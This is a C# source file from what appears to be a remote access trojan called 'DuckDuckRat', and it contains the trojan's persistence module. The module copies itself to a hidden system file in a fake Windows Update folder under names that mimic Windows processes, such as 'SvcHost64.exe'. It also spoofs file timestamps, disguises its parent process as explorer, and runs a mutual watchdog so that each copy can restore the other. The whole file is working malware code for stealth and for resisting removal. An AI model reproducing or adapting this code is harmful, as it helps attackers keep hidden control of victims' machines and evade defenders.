using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using DuckDuckRat.Modules;

namespace DuckDuckRat.Modules
{
    public static class TwinService
    {
        private static readonly string[] LEGIT_NAMES = {
            "WinUpdateSvc.exe",
            "CertsNotify.exe",
            "DisplayHlpr.exe",
            "TaskHostUpdate.exe",
            "SvcHost64.exe",
            "AppFrameHost.exe",
            "TextInputHost.exe"
        };

        public static void StartGuardian()
        {
            try
            {
                // [GHOST] Smart redundant check: avoid spawning multiple twins
                foreach (var name in LEGIT_NAMES) {
                    var existing = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name));
                    if (existing.Length > 0) {
                        // Twin already active, just link monitoring if needed
                        // (Usually the twin will find US, but we can also find it)
                        foreach (var t in existing) {
                             WatchdogManager.Start(t.Id, ""); // Path unknown but PID is enough for monitoring
                             return; 
                        }
                    }
                }

                string selfPath = Process.GetCurrentProcess().MainModule.FileName;
                string tempDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);

                Random rnd = new Random();
                string randomName = LEGIT_NAMES[rnd.Next(LEGIT_NAMES.Length)];
                string twinPath = Path.Combine(tempDir, randomName);

                // Strategy: Stealth Copy
                if (File.Exists(twinPath))
                {
                    try { File.Delete(twinPath); } catch { }
                }
                
                File.Copy(selfPath, twinPath, true);
                SafetyManager.CopyFileTime(twinPath);
                
                // Hide the file
                File.SetAttributes(twinPath, FileAttributes.Hidden | FileAttributes.System);

                int myPid = Process.GetCurrentProcess().Id;
                // Arguments: Tell the twin who to monitor (ME) and where I am (for my recovery)
                string args = $"--guardian={myPid}:{selfPath}";

                // PPID Spoofing for Task Manager Stealth
                // Make it look like a child of explorer or svchost
                bool success = DuckDuckRat.ElevationService.SpawnWithSpoof(twinPath, args, "explorer");
                
                if (!success)
                {
                    // Fallback to regular start if spoofing fails
                    Process.Start(new ProcessStartInfo 
                    { 
                        FileName = twinPath, 
                        Arguments = args, 
                        CreateNoWindow = true, 
                        UseShellExecute = false 
                    });
                }
                
                // Now start monitoring the twin we just created.
                // We don't have its PID easily from SpawnWithSpoof yet, but we can find it by name.
                // Or better: the TWIN will start and it will know its parent (US).
                // Actually, for a TRUE mutual watchdog, we need the twin's PID.
                
                _ = System.Threading.Tasks.Task.Run(async () => {
                    await System.Threading.Tasks.Task.Delay(2000);
                    var twins = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(randomName));
                    foreach (var t in twins)
                    {
                        // Check if it's our newly spawned twin (basic check)
                        if (t.Id != myPid)
                        {
                            WatchdogManager.Start(t.Id, twinPath);
                            break;
                        }
                    }
                });
            }
            catch { }
        }
    }
}


